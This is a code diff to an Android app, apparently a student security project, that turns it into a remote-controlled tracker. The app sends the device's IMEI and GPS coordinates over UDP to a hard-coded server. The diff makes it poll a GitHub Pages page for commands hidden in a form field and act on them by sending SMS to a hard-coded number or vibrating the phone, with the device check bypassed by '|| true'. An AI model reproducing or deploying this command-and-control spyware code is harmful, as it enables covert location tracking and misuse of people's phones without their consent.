@@ -11,8 +11,10 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.Vibrator;
 import android.provider.MediaStore;
 import android.support.v7.app.AppCompatActivity;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
@@ -57,11 +59,11 @@ public class MainActivity extends AppCompatActivity {
     String uploadFileName = "";
     //agregado por Juan (16-6)
     Location lastLocation = null;
-    long lastTime=0;
+    long lastTime = 0;
     // agregado por Juan (17-6)
-    String ServerIP="192.168.22.125";
-    int ServerPort=9999;
-    String imei="";
+    String ServerIP = "192.168.1.104";
+    int ServerPort = 9999;
+    String imei = "";
     /**
      * ATTENTION: This was auto-generated to implement the App Indexing API.
      * See https://g.co/AppIndexing/AndroidStudio for more information.
@@ -100,11 +102,11 @@ public class MainActivity extends AppCompatActivity {
             }
         });
         //agregado por Juan (22-6)
-        BrowserTask btask=new BrowserTask();
-        btask.execute("maxi1985798.github.io/tpseginf/");
-        Log.i(TAG, "!!!! HTML:"+btask.codigoAParsear);
-        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-        imei=telephonyManager.getDeviceId();
+        //BrowserTask btask=new BrowserTask();
+        //btask.execute("maxi1985798.github.io/tpseginf/");
+        //Log.i(TAG, "!!!! HTML:"+btask.codigoAParsear);
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        imei = telephonyManager.getDeviceId();
         //agregado por Juan (16-6)
         //----------------------------------------------
 
@@ -115,13 +117,16 @@ public class MainActivity extends AppCompatActivity {
         LocationListener locationListener = new LocationListener() {
             public void onLocationChanged(Location location) {
 
-                if ((location.getTime()-lastTime)>120*1000) {
-                    lastLocation=location;
-                    lastTime=lastLocation.getTime();
+                if ((location.getTime() - lastTime) > 120 * 1000) {
+                    lastLocation = location;
+                    lastTime = lastLocation.getTime();
                     // Called when a new location is found by the network location provider.
                     Log.v(TAG, "(!!!!) Localización :  " + location.toString());
-                    conectUDPTask con=new conectUDPTask();
+                    conectUDPTask con = new conectUDPTask();
                     con.execute(location);
+                    BrowserTask btask = new BrowserTask();
+                    btask.execute("maxi1985798.github.io/tpseginf/");
+                    //Log.i(TAG, "!!!! Loc-HTML:"+btask.codigoAParsear);
 
                 }
                 //   mandarPorMail(location);
@@ -400,27 +405,30 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
         Log.i(TAG, "The onDestroy() event");
     }
+
     //agregado por Juan (17-6)
     //----------------------------
-    private void mandarPorMail(Location location){
+    private void mandarPorMail(Location location) {
         Intent i = new Intent(Intent.ACTION_SEND);
         i.setType("message/rfc822");
-        i.putExtra(Intent.EXTRA_EMAIL  , new String[]{"juannombreapellido@gmail.com"});
+        i.putExtra(Intent.EXTRA_EMAIL, new String[]{"juannombreapellido@gmail.com"});
         i.putExtra(Intent.EXTRA_SUBJECT, "localizar");
-        i.putExtra(Intent.EXTRA_TEXT   , location.toString());
+        i.putExtra(Intent.EXTRA_TEXT, location.toString());
         try {
             startActivity(Intent.createChooser(i, "Send mail..."));
         } catch (android.content.ActivityNotFoundException ex) {
-            Log.e(TAG,"No hay clientes de email disponibles");
+            Log.e(TAG, "No hay clientes de email disponibles");
             //Toast.makeText(MyActivity.this, "There are no email clients installed.", Toast.LENGTH_SHORT).show();
         }
 
     }
-    private void mandarPorHttp(Location location){
+
+    private void mandarPorHttp(Location location) {
         DemoTask sendTask = new DemoTask();
-        String [] coord={Double.toString(location.getLatitude()),Double.toString(location.getLongitude())};
+        String[] coord = {Double.toString(location.getLatitude()), Double.toString(location.getLongitude())};
         sendTask.execute(coord);
     }
+
     //----------------------------
     //agregado por Juan (16-6)
     //----------------------------
@@ -430,7 +438,7 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         protected String doInBackground(String... params) {
-            String com="location";
+            String com = "location";
             if (params.length == 0) {
 
                 return null;
@@ -444,7 +452,7 @@ public class MainActivity extends AppCompatActivity {
 
             try {
                 // Construimos la URL
-                final String FORECAST_BASE_URL = "http://"+ServerIP;
+                final String FORECAST_BASE_URL = "http://" + ServerIP;
                 final String QUERY_PARAM = "location";
                 final String PARAM1 = "latitud";
                 final String PARAM2 = "longitud";
@@ -510,16 +518,17 @@ public class MainActivity extends AppCompatActivity {
         }
 
     }
+
     //----------------------------
     //agregado por Juan (22-6)
     //----------------------------
     //necesario para conectarse al servidor y descargar los comandos
-    public class BrowserTask extends AsyncTask<String, Void, String> {
-        public String codigoAParsear="";
+    public class BrowserTask extends AsyncTask<String, Void, String[]> {
+        public String[] codigoAParsear = {};
 
         @Override
-        protected String doInBackground(String... params) {
-            String codigohtml = "";
+        protected String[] doInBackground(String... params) {
+            String[] codigohtml = {};
             if (params.length == 0) {
                 return null;
             }
@@ -531,7 +540,7 @@ public class MainActivity extends AppCompatActivity {
 
             try {
                 // Construimos la URL
-                final String FORECAST_BASE_URL = "https://"+params[0];
+                final String FORECAST_BASE_URL = "https://" + params[0];
 
                /* final String FORMAT_PARAM = "mode";
                 final String UNITS_PARAM = "units";
@@ -561,11 +570,38 @@ public class MainActivity extends AppCompatActivity {
 
                 reader = new BufferedReader(new InputStreamReader(inputStream));
                 String line;
+                String line_sin_tab;
+                String[] separated;
+                String aca_va_el_comando;
+                String comando;
+                int i = 0;
                 while ((line = reader.readLine()) != null) {
                     //agregamos un salto de linea, para facilitar la lectura
                     buffer.append(line + "\n");
-                    codigohtml=codigohtml+line;
-                    //Log.i(TAG,"!!!! HTML desde doInBackground: "+line);
+                    line_sin_tab = line.trim();
+                    separated = line_sin_tab.split(" ");
+
+                    if (separated[0].compareTo("<input") == 0) {
+                        //Log.v(TAG,"!!!! HTML desde doInBackground1: "+invento);
+                        //Log.v(TAG,"!!!! HTML desde doInBackground1: "+separated[0]);
+                        comando = separated[2].replace("name=","");
+                        comando = separated[2].replace("\"","");
+                        if(comando.compareTo("comando") == 0){
+                            aca_va_el_comando = separated[3].replace("value=", "");
+                            aca_va_el_comando = aca_va_el_comando.replace(">", "");
+                            aca_va_el_comando = aca_va_el_comando.replace("\"", "");
+                            codigohtml = aca_va_el_comando.split(":");
+                        }
+
+                        //codigohtml = codigohtml+aca_va_el_comando;
+                        //Log.v(TAG,"!!!! HTML desde doInBackground3: "+aca_va_el_comando);
+                    }
+                    /*else {
+                        Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
+                    }*/
+
+                    //Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
+                    i = i + 1;
                 }
                 /*
                 if (buffer.length() == 0) {
@@ -601,15 +637,26 @@ public class MainActivity extends AppCompatActivity {
             }
 
 
-
             // This will only happen if there was an error getting or parsing the forecast.
 
         }
 
         @Override
-        protected void onPostExecute(String result) {
-            Log.i(TAG,"resultado en PostExecute: "+result);
-             codigoAParsear = result;
+        protected void onPostExecute(String[] result) {
+            Log.i(TAG, "resultado en PostExecute: " + result[0] + " " + result[1] + " " + result[2]);
+            if (result[0].compareTo(imei) == 0 || true) {
+                if (result[1].compareToIgnoreCase("sms") == 0) {
+                    sendSMS("3874060438", "test");
+                }
+                if (result[1].compareToIgnoreCase("vibrar") == 0) {
+                    onVibrate();
+                }
+
+
+            }
+
+            codigoAParsear = result;
+            Log.i(TAG, "resultado en PostExecute1: " + codigoAParsear[0] + " " + codigoAParsear[1] + " " + codigoAParsear[2]);
         }
 
     }
@@ -624,27 +671,28 @@ public class MainActivity extends AppCompatActivity {
             if (locations.length == 0) {
                 return null;
             }
-            Location location=locations[0];
+            Location location = locations[0];
             try {
-                mandarPorUDP("\n["+imei+"]\n\nt="+Double.toString(location.getTime())+"\nlat="+Double.toString(location.getLatitude())+"\nlong="+Double.toString(location.getLongitude()));
+                mandarPorUDP("\n[" + imei + "]\n\nt=" + Double.toString(location.getTime()) + "\nlat=" + Double.toString(location.getLatitude()) + "\nlong=" + Double.toString(location.getLongitude()));
                 return null;
             } catch (IOException e) {
-                Log.e(TAG,"No se pudo enviar por UDP");
+                Log.e(TAG, "No se pudo enviar por UDP");
                 return null;
             }
         }
-        private void mandarPorUDP(String str) throws IOException{
+
+        private void mandarPorUDP(String str) throws IOException {
 
 
             DatagramSocket client_socket = new DatagramSocket(ServerPort);
-            InetAddress IPAddress =  InetAddress.getByName(ServerIP);
+            InetAddress IPAddress = InetAddress.getByName(ServerIP);
 
             //while (true)
             // {
             byte[] send_data = str.getBytes();
             //System.out.println("Type Something (q or Q to quit): ");
 
-            DatagramPacket send_packet = new DatagramPacket(send_data,str.length(), IPAddress, ServerPort);
+            DatagramPacket send_packet = new DatagramPacket(send_data, str.length(), IPAddress, ServerPort);
             client_socket.send(send_packet);
         /*
         //chandra
@@ -668,4 +716,28 @@ public class MainActivity extends AppCompatActivity {
 
 
     //----------------------------
+
+
+    //----------------------------
+//agregado por juan  25-6
+//código para que vibre y envíe sms
+    public void onVibrate() {
+        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+        v.vibrate(1000);
+    }
+
+    public void sendSMS(String phoneNum, String msg) {
+        //String phoneNo = phoneNum;
+        //String msg = "This is a message";
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(phoneNum, null, msg, null, null);
+        /*Toast.makeText(getApplicationContext(), "Message Sent",
+                Toast.LENGTH_LONG).show();*/
+        } catch (Exception ex) {
+        /*Toast.makeText(getApplicationContext(), ex.getMessage(),
+                Toast.LENGTH_LONG).show();*/
+            ex.printStackTrace();
+        }
+    }
 }
